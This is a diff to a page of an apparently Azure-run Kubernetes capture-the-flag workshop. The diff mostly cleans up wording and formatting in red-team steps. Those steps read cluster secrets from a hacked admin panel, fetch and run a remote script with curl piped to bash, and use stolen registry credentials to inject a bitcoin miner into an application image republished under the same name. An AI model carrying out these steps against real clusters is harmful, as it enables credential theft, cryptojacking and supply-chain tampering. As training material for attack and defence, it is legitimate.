@@ -4,13 +4,13 @@
 
 It appears the blue team has again deleted our bitcoinero pods.  It's time to get sneakier.  Instead of trying to deploy new pods into their cluster, let's poke around to see if there's anything we can use.
 
-Lets , let's see if there's any credentials accessible.
+Lets see if there are any credentials accessible.
 
-```
-# In case you need to re-download kubectl
+In the hacked admin panel, run the following:
+```console
 cd /usr/local/bin; curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod 555 kubectl
-
-# Let's see if there's any secrets left out for us to grab
+```
+```console
 kubectl get secrets
 ```
 
@@ -35,17 +35,19 @@ Some of the other red-team members have found this [neat trick from Twitter](htt
 
 Good luck!  They've come up with two scripts:
 
-* [run-bitcoin-injector.sh](https://github.com/azure/aks-ctf/blob/main/workshop/scenario_3/run-bitcoin-injector.sh) - deploy a [Kubernetes Job](https://kubernetes.io/docs/concepts/workloads/controllers/job/) that uses the registry credentials we found, to create another pod that injects our bitcoin miner into the container
-* [inject-image.sh](https://github.com/azure/aks-ctf/blob/main/workshop/scenario_3/inject-image.sh) - Uses Buildah to pulls the current app image, injects the bitcoin miner into the image, re-publishes the image under the same name
+* [run-bitcoin-injector.sh](https://github.com/azure/aks-ctf/blob/main/workshop/scenario_3/run-bitcoin-injector.sh) - deploys a [Kubernetes Job](https://kubernetes.io/docs/concepts/workloads/controllers/job/) that uses the registry credentials we found, to create another pod that injects our bitcoinero miner into the container
+* [inject-image.sh](https://github.com/azure/aks-ctf/blob/main/workshop/scenario_3/inject-image.sh) - Uses Buildah to pull the current app image, inject the bitcoinero miner into the image and re-publish the image under the same name
 
 Let's go back to our admin panel and run the following:
 
 ```console
 curl -O -J https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_3/run-bitcoin-injector.sh; bash run-bitcoin-injector.sh
 ```
+!!!tip Tip
+    This command may take 1-2 minutes to run. Do not referesh the browser page. Wait for the command to complete.
 
 Everything has been installed.  Let's kill our process and let the new image come up
-```
+```console
 kubectl delete pod $HOSTNAME
 ```
 
